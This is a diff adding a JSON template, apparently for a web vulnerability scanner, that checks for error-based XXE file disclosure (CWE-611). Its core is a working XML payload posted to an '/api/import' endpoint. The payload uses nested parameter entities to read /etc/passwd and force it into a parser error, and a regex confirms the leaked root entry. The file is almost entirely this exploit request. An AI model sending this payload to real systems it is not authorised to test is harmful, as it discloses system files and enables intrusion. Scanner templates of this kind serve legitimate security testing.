@@ -1,0 +1,31 @@
+{
+  "name": "web/XXE error-based file disclosure",
+  "description": "[high] Proves error-based XXE file read: parameter entity embeds /etc/passwd into a failing external-entity URI so the parser error carries file content (libxml/Xerces oracle) — works where in-band reflection is suppressed. Keywords: xxe xml external entity error-based doctype param entity file read. ctrl: DTD-prohibited error carries no file content -> not falsified. base_url = XML import endpoint.",
+  "cwe": "CWE-611",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/api/import",
+      "headers": {
+        "Content-Type": "application/xml"
+      },
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % f SYSTEM \"file:///etc/passwd\"><!ENTITY % e \"<!ENTITY &#37; g SYSTEM 'x:/%f;'>\">%e;%g;]><r/>"
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "root:[x*]:0:0",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "8a9b21e6846e",
+  "created": "2026-11-06T02:07:37.515534+00:00",
+  "last_used": "2026-11-06T02:07:37.515534+00:00"
+}
